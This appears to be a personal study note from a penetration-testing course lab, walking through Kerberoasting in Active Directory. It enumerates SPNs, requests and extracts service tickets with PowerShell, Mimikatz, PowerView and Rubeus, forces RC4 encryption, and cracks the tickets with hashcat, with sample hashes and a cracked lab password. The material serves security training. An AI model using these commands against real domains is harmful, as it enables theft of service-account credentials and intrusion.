## Table of Contents

  - [Table of Contents](#Table\of\Contents)
        - [Terminology](#Terminology)
- [Kerberoasting - Semi Manual Method](#kerberoasting\-\semi\manual\method)
    - [Enumeratin SPNs with setspn.exe](#Enumeratin\SPNs\with\setspn.exe)
    - [Retrieving All Tickets using setspn.exe](#Retrieving\All\Tickets\using\setspn.exe)
      - [Extracting Tickets From Memory with Mimikatz](#Extracting\Tickets\From\Memory\with\Mimikatz)
      - [Preparing the Base64 Blob for Cracking](#Preparing\the\Base64\Blob\for\Cracking)
- [placing the output into a file as .kirbi](#placing\the\output\into\a\file\as\.kirbi)
    - [Extracting the Kerberos Ticker Using kirbi2john.py](#Extracting\the\Kerberos\Ticker\Using\kirbi2john.py)
      - [Modifiying crack_file for Hashcat](#Modifiying\crack_file\for\Hashcat)
      - [Cracking the Hash with Hashcat](#Cracking\the\Hash\with\Hashcat)
  - [Automated/Tool Based Route](#Automated/Tool\Based\Route)
    - [Using PowerView to Extract TGS Tickets](#Using\PowerView\to\Extract\TGS\Tickets)
    - [Targeting a specific user to retrieve TGS ticket in hashcat format using powerview](#Targeting\a\specific\user\to\retrieve\TGS\ticket\in\hashcat\format\using\powerview)
      - [Exporting All Tickets to a CSV File](#Exporting\All\Tickets\to\a\CSV\File)
      - [Viewing the Contents of the .CSV File](#Viewing\the\Contents\of\the\.CSV\File)
  - [Using Rubeus](#Using\Rubeus)
      - [Other Rubeus options](#Other\Rubeus\options)
      - [Using the /stats Flag](#Using\the\/stats\Flag)
      - [Using the /nowrap Flag](#Using\the\/nowrap\Flag)
        - [Note on encryption types](#Note\on\encryption\types)
      - [Checking Supported Encryption Types](#Checking\Supported\Encryption\Types)
      - [Requesting a New Ticket](#Requesting\a\New\Ticket)
      - [Running Hashcat & Checking the Status of the Cracking Job](#Running\Hashcat\&\Checking\the\Status\of\the\Cracking\Job)
      - [Using the /tgtdeleg flag](#Using\the\/tgtdeleg\flag)

## Table of Contents

        - [Terminology](#Terminology)
- [Kerberoasting - Semi Manual Method](#kerberoasting\-\semi\manual\method)
    - [Enumeratin SPNs with setspn.exe](#Enumeratin\SPNs\with\setspn.exe)
    - [Retrieving All Tickets using setspn.exe](#Retrieving\All\Tickets\using\setspn.exe)
      - [Extracting Tickets From Memory with Mimikatz](#Extracting\Tickets\From\Memory\with\Mimikatz)
      - [Preparing the Base64 Blob for Cracking](#Preparing\the\Base64\Blob\for\Cracking)
- [placing the output into a file as .kirbi](#placing\the\output\into\a\file\as\.kirbi)
    - [Extracting the Kerberos Ticker Using kirbi2john.py](#Extracting\the\Kerberos\Ticker\Using\kirbi2john.py)
      - [Modifiying crack_file for Hashcat](#Modifiying\crack_file\for\Hashcat)
      - [Cracking the Hash with Hashcat](#Cracking\the\Hash\with\Hashcat)
  - [Automated/Tool Based Route](#Automated/Tool\Based\Route)
    - [Using PowerView to Extract TGS Tickets](#Using\PowerView\to\Extract\TGS\Tickets)
    - [Targeting a specific user to retrieve TGS ticket in hashcat format using powerview](#Targeting\a\specific\user\to\retrieve\TGS\ticket\in\hashcat\format\using\powerview)
      - [Exporting All Tickets to a CSV File](#Exporting\All\Tickets\to\a\CSV\File)
      - [Viewing the Contents of the .CSV File](#Viewing\the\Contents\of\the\.CSV\File)
  - [Using Rubeus](#Using\Rubeus)
      - [Other Rubeus options](#Other\Rubeus\options)
      - [Using the /stats Flag](#Using\the\/stats\Flag)
      - [Using the /nowrap Flag](#Using\the\/nowrap\Flag)
        - [Note on encryption types](#Note\on\encryption\types)
      - [Checking Supported Encryption Types](#Checking\Supported\Encryption\Types)
      - [Requesting a New Ticket](#Requesting\a\New\Ticket)
      - [Running Hashcat & Checking the Status of the Cracking Job](#Running\Hashcat\&\Checking\the\Status\of\the\Cracking\Job)
      - [Using the /tgtdeleg flag](#Using\the\/tgtdeleg\flag)


##### Terminology
`Authenticator` - The output of the function in which passwords are sent (encrypted) over the wire. It looks up the account password (aka pre-auth data). When `DC` receives the authenticator, it looks up the account password (long-term key), decrypts the authenticator and compares the result to its own time. if the timestamps match within 5 minutes it knows the correct password was used and that a replay attack is very unlikely.
`Ticket Granting Ticker (TGT)` #TGT #kerberos - Domain controller will return a TGT to the account once the authenticator has been validated. Inside the TGT is the SID of the account, SIDs of the account groups and a session key. The TGT is only read by domain controllers from the domain where it was issued.  To keep it private the TGT is encrypted with the password of the **KRBTGT** domain account.  As a result, the contents of the TGT cannot be read by the client.
`Service Ticket` - When an account wants access to a resource it will request a service ticket from the domain controller by providing the name of the rsource, its copy of the TGT adn an authenticator generated based on the TGT session key. 
# Kerberoasting - Semi Manual Method

Before `rubeus` existed, stealing or forgin kerberos tickets was a complex, manual process. There are multiple ways to perform These attacks now.

### Enumeratin SPNs with setspn.exe
```shell
C:\htb> setspn.exe -Q */*
#OUTPUT

Checking domain DC=INLANEFREIGHT,DC=LOCAL
CN=ACADEMY-EA-DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL
        exchangeAB/ACADEMY-EA-DC01
        exchangeAB/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
        TERMSRV/ACADEMY-EA-DC01
        TERMSRV/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
        ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/ForestDnsZones.INLANEFREIGHT.LOCAL
        ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DomainDnsZones.INLANEFREIGHT.LOCAL
```

 We will focus on `user accounts` and ignore the computer accounts returned by the tool.
 
  Next, (in PowerShell) we can request TGS tickets for an account in the shell above and load them into memory. 
  
  Once they are loaded into memory, we can extract them using `Mimikatz`. Let's try this by targeting a single user:
  ### Targeting a Single User
```powershell
PS C:\htb> Add-Type -AssemblyName System.IdentityModel

PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

#OUTPUT
Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-2
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 2/24/2022 11:36:22 PM
ValidTo              : 2/25/2022 8:55:25 AM
ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
```
Before moving on, let's break down the commands above to see what we are doing (which is essentially what is used by [Rubeus](https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1) when using the default Kerberoasting method):


- `Add-Type`: used to add a .NET framework class to our powershell session, which can then be instantiated like any .NET framework object
- `-AssemblyName`: Allows us to specify an assembly that contains type that we are interested in using
- - [System.IdentityModel](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel?view=netframework-4.8) is a namespace that contains different classes for building security token services
- We'll then use the [New-Object](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object?view=powershell-7.2) cmdlet to create an instance of a .NET Framework object
- We'll use the [System.IdentityModel.Tokens](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens?view=netframework-4.8) namespace with the [KerberosRequestorSecurityToken](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8) class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session


### Retrieving All Tickets using setspn.exe
```powershell
PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

The above command combines the previous command with `setspn.exe` to request tickets for all accounts with SPNs set.

Now that the tickets are loaded, we can use `Mimikatz` to extract the ticket(s) from `memory`.

#### Extracting Tickets From Memory with Mimikatz
```powershell
mimikatz # base64 out:true

mimkatz # kerberos::list /export

<SNIP>

[00000002] - 0x00000017 - rc4_hmac_nt      
   Start/End/MaxRenew: 2/24/2022 3:36:22 PM ; 2/25/2022 12:55:25 AM ; 3/3/2022 2:55:25 PM
   Server Name       : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 @ INLANEFREIGHT.LOCAL
   Client Name       : htb-student @ INLANEFREIGHT.LOCAL
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; 
====================
Base64 of file : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi
====================
doIGPzCCBjugAwIBBaEDAgEWooIFKDCCBSRhggUgMIIFHKADAgEFoRUbE0lOTEFO

[<SNIP>]
```
If we do not specify the `base64 /out:true` command, Mimikatz will extract the tickets and write them to `.kirbi` files. Depending on our position on the network and if we can easily move files to our attack host, this can be easier when we go to crack the tickets. Let's take the base64 blob retrieved above and prepare it for cracking.

Next, we can take the base64 blob and remove new lines and white spaces since the output is column wrapped, and we need it all on one line for the next step.

#### Preparing the Base64 Blob for Cracking

  Preparing the Base64 Blob for Cracking

```bash
$ echo "<base64 blob>" |  tr -d \\n

# placing the output into a file as .kirbi

cat <file> | base64 -d > sqldev.kirbi

```
Next, we can use [this](https://raw.githubusercontent.com/nidem/kerberoast/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py) version of the `kirbi2john.py` tool to extract the Kerberos ticket from the TGS file.


### Extracting the Kerberos Ticker Using kirbi2john.py
```bash
$ python2.7 kirbi2john.py sqldev.kribi
```
	This will create a file called crack_file. Must modify the file a bit to be able to use hashcat against it.


#### Modifiying crack_file for Hashcat

```bash
[~/] sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

We can then run the ticket through Hashcat again and get the cleartext password `database!`.

#### Cracking the Hash with Hashcat

  Cracking the Hash with Hashcat

```shell-session
gdxqpardo@htb[/htb]$ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```

## Automated/Tool Based Route
#powerview #windows #kerberos #kerberoast 

### Using PowerView to Extract TGS Tickets
```powershell
PS C:\EP> Import-Module .\PowerView.ps1

PS C:\EP> Get-DomainUser * -spn | select samaccountname
#OUTPUT:

samaccountname
--------------
adfs
backupagent
krbtgt
sqldev
sqlprod
sqlqa
solarwindsmonitor
```

### Targeting a specific user to retrieve TGS ticket in hashcat format using powerview
#powerview #specificuserTGS #TGS #kerberos 

```powershell
PS C:\EP> Get-DomainUser -Identity <user> | Get-DomainSPNTicket -Format Hashcat
```

Finally, we can export all tickets to a CSV file for offline processing.

#### Exporting All Tickets to a CSV File
```powershell
PS C:\EP> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\<filename>.csv -NoTypeInformation
```
#### Viewing the Contents of the .CSV File

  Viewing the Contents of the .CSV File

```powershell-session
PS C:\htb> cat .\ilfreight_tgs.csv

"SamAccountName","DistinguishedName","ServicePrincipalName","TicketByteHexStream","Hash"
"adfs","CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL","adfsconnect/azure01.inlanefreight.local",,"$krb5tgs$23$*adfs$INLANEFREIGHT.LOCAL$adfsconnect/azure01.inlanefreight.local*$59C086008BBE7EAE4E483506632F6EF8$622D9E1DBCB1FF2183482478B5559905E0CCBDEA2B52A5D9F510048481F2A3A4D2CC47345283A9E71D65E1573DCF6F2380A6FFF470722B5DEE704C51FF3A3C2CDB2945CA56F7763E117F04F26CA71EEACED25730FDCB06297ED4076C9CE1A1DBFE961DCE13C2D6455339D0D90983895D882CFA21656E41C3DDDC4951D1031EC8173BEEF9532337135A4CF70AE08F0FB34B6C1E3104F35D9B84E7DF7AC72F514BE2B346954C7F8C0748E46A28CCE765AF31628D3522A1E90FA187A124CA9D5F911318752082FF525B0BE1401FBA745E1

<SNIP>
```

## Using Rubeus
#rubeus #activedirectory #kerberos #kerberoast 

 [Rubeus](https://github.com/GhostPack/Rubeus)

  
Using Rubeus

```powershell-session
PS C:\htb> .\Rubeus.exe

<SNIP>

Roasting:

    Perform Kerberoasting:
Rubeus.exe kerberoast [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]

    Perform Kerberoasting, outputting hashes to a file:
        Rubeus.exe kerberoast /outfile:hashes.txt [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps]

    Perform Kerberoasting, outputting hashes in the file output format, but to the console:
        Rubeus.exe kerberoast /simple [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]

    Perform Kerberoasting with alternate credentials:
        Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]

    Perform Kerberoasting with an existing TGT:
        Rubeus.exe kerberoast </spn:"blah/blah" | /spns:C:\temp\spns.txt> </ticket:BASE64 | /ticket:FILE.KIRBI> [/nowrap]

    Perform Kerberoasting with an existing TGT using an enterprise principal:
        Rubeus.exe kerberoast </spn:user@domain.com | /spns:user1@domain.com,user2@domain.com> /enterprise </ticket:BASE64 | /ticket:FILE.KIRBI> [/nowrap]

    Perform Kerberoasting with an existing TGT and automatically retry with the enterprise principal if any fail:
        Rubeus.exe kerberoast </ticket:BASE64 | /ticket:FILE.KIRBI> /autoenterprise [/ldaps] [/nowrap]

    Perform Kerberoasting using the tgtdeleg ticket to request service tickets - requests RC4 for AES accounts:
        Rubeus.exe kerberoast /usetgtdeleg [/ldaps] [/nowrap]

    Perform "opsec" Kerberoasting, using tgtdeleg, and filtering out AES-enabled accounts:
        Rubeus.exe kerberoast /rc4opsec [/ldaps] [/nowrap]

    List statistics about found Kerberoastable accounts without actually sending ticket requests:
        Rubeus.exe kerberoast /stats [/ldaps] [/nowrap]

    Perform Kerberoasting, requesting tickets only for accounts with an admin count of 1 (custom LDAP filter):
        Rubeus.exe kerberoast /ldapfilter:'admincount=1' [/ldaps] [/nowrap]

    Perform Kerberoasting, requesting tickets only for accounts whose password was last set between 01-31-2005 and 03-29-2010, returning up to 5 service tickets:
        Rubeus.exe kerberoast /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:5 [/ldaps] [/nowrap]

    Perform Kerberoasting, with a delay of 5000 milliseconds and a jitter of 30%:
        Rubeus.exe kerberoast /delay:5000 /jitter:30 [/ldaps] [/nowrap]

    Perform AES Kerberoasting:
        Rubeus.exe kerberoast /aes [/ldaps] [/nowrap]
```

#### Other Rubeus options
- performing kerberoasting and outputting hashes to a file
- Using alternate credentials
- performing kerberoasting combined with a pass-the-ticket attack
- Requesting tickets for accounts passwords set between a specific date range
- Placing a limit on the number of tickets requested
- Performing AES Kerberoasting

#### Using the /stats Flag

  Using the /stats Flag

```powershell-session
PS C:\htb> .\Rubeus.exe kerberoast /stats
```
```powershell-session
[*] Action: Kerberoasting

[*] Listing statistics about target users, no ticket requests being performed.
[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 9


 ------------------------------------------------------------
 | Supported Encryption Type                        | Count |
 ------------------------------------------------------------
 | RC4_HMAC_DEFAULT                                 | 7     |
 | AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96 | 2     |
 ------------------------------------------------------------

 ----------------------------------
 | Password Last Set Year | Count |
 ----------------------------------
 | 2022                   | 9     |
 ----------------------------------
```
Let's use Rubeus to request tickets for accounts with the `admincount` attribute set to `1`. These would likely be high-value targets and worth our initial focus for offline cracking efforts with Hashcat. Be sure to specify the `/nowrap` flag so that the hash can be more easily copied down for offline cracking using Hashcat. Per the documentation, the ""/nowrap" flag prevents any base64 ticket blobs from being column wrapped for any function"; therefore, we won't have to worry about trimming white space or newlines before cracking with Hashcat.

#### Using the /nowrap Flag

  Using the /nowrap Flag

```powershell-session
PS C:\htb> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

##### Note on encryption types
Kerberoasting tools typically request `RC4` Encryption when performing the attack and intiating `TGS-REQ` requests. This is because RC4 is weaker and easier to crack offline using tools such as hashcat that other encryption algorithms such as AES-128 and AES-256. When performing kerberoasting in most environments, receive an AES-256 (type 18) encrypted hash or hash that begins with `$krb5tgs$18$*`.


Its possible to crack AES-128(type 17), and AES-256(type 18) using hashcat. It will take a long time and consume a lot more cracking capability than RC4 (type 23) encrypted ticket, still possible especially if a weak password is chsoen.


Let's start by creating an SPN account named `testspn` and using Rubeus to Kerberoast this specific user to test this out. As we can see, we received the TGS ticket RC4 (type 23) encrypted.

  Using the /nowrap Flag

```powershell-session
PS C:\htb> .\Rubeus.exe kerberoast /user:testspn /nowrap

[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : testspn
[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=testspn)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


[*] SamAccountName         : testspn
[*] DistinguishedName      : CN=testspn,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName   : testspn/kerberoast.inlanefreight.local
[*] PwdLastSet             : 2/27/2022 12:15:43 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   :
```

`RC4 encryption uses the weak NTLM hash as the key for encryption.  To date tickets encrypted with AES keys are not susceptible to Kerberoasting.`

  
Using the /nowrap Flag

```powershell-session
PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```


  
Cracking the Ticket with Hashcat & rockyou.txt

```shell-session
gdxqpardo@htb[/htb]$ hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt 
```

#### Checking Supported Encryption Types

  Checking Supported Encryption Types

```powershell-session
PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

Requesting a new ticket with Rubeus will show us that the account name is using AES-256 (type 18) encryption.

#### Requesting a New Ticket

  Requesting a New Ticket

```powershell-session
PS C:\htb>  .\Rubeus.exe kerberoast /user:testspn /nowrap
```

To run this through Hashcat, we need to use hash mode `19700`, which is `Kerberos 5, etype 18, TGS-REP (AES256-CTS-HMAC-SHA1-96)` per the handy Hashcat [example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) table. We run the AES hash as follows and check the status, which shows it should take over 23 minutes to run through the entire rockyou.txt wordlist by typing `s` to see the status of the cracking job.


#### Running Hashcat & Checking the Status of the Cracking Job

  Running Hashcat & Checking the Status of the Cracking Job

```shell-session
gdxqpardo@htb[/htb]$ hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 
```
We can use Rubeus with the `/tgtdeleg` flag to specify that we want only RC4 encryption when requesting a new service ticket. The tool does this by specifying RC4 encryption as the only algorithm we support in the body of the TGS request. This may be a failsafe built-in to Active Directory for backward compatibility. By using this flag, we can request an RC4 (type 23) encrypted ticket that can be cracked much faster.

#### Using the /tgtdeleg flag
```powershell
PS C:\EP> .\Rubeus.exe kerberoast /tgtdeleg /user:testspn /nowrap
```




